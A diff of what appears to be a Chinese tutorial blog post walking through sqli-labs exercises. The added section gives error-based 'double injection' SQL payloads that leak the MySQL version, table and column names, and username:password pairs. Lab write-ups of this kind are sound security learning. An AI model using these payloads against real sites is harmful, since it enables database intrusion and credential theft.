@@ -209,17 +209,59 @@ Less_1 ～ Less_4都是相同的情况，只需要通过fuzz猜出最后执行�
 
 <h6>注入语句：</h6>   
 
-<code>and (select 1 from (select count(*),concat((select version(),floor(rand(0)*2))a from 
+<code>and (select 1 from (select count(*),concat((select version()),floor(rand(0)*2))a from 
 information_schema.tables group by a)x)%23</code>
 
 关于这个错误的原理，我还是没有了解清楚。不过大致上是：group by 的值不能为rand()产生的数。
 
-[说法一](https://segmentfault.com/q/1010000000609508)
+[解释一](https://segmentfault.com/q/1010000000609508)
 
-[说法二](http://stackoverflow.com/questions/11787558/sql-injection-attack-what-does-this-do)
+[解释二](http://stackoverflow.com/questions/11787558/sql-injection-attack-what-does-this-do)
+
+<h4>Example</h4>
+
+<h5>Double Injection - Single Quotes </h5>
+
+这种类型的注入，可以利用再页面会显示sql语句错误提示的页面中。
+
+上一个例子也适用。
+
+先测试一下：
+
+<code>?id=1' and (select 1 from (select count(*),concat((select version()),floor(rand(0)*2))a
+ from information_schema.tables group by a)x)%23</code>
+
+<img src="/images/sql_4.png">
+
+
+开始爆表：
+
+<code>?id=1%27%20and%20%28select%201%20from%20%28select%20count%28*%29,
+concat%28%28select%20table_name%20from%20information_schema.tables%20limit%20139,1%29,
+floor%28rand%280%29*2%29%29a%20from%20information_schema.tables%20group%20by%20a%29x%29%23</code>
+
+<img src="/images/sql_5.png">
+
+接下来就是爆列和字段。
+
+<code>?id=1' and (select 1 from (select count(*),concat((select column_name
+ from information_schema.columns limit 1664,1),floor(rand(0)*2))a from 
+ information_schema.tables group by a)x)%23
+</code>
+
+<img src="/images/sql_6.png">
+
+<img src="/images/sql_7.png">
+
+因为只能返回一列的数据，所以用limit来限制返回的数据，就只能一个一个数字来试。
+
+<code>?id=1' and (select 1 from (select count(*),
+concat((select concat(username,':',password) from users limit 1,1),
+floor(rand(0)*2))a from information_schema.tables group by a)x)%23</code>
+
+<img src="/images/sql_8.png">
 
 
 <code>...待续</code>
-
 
 EOF
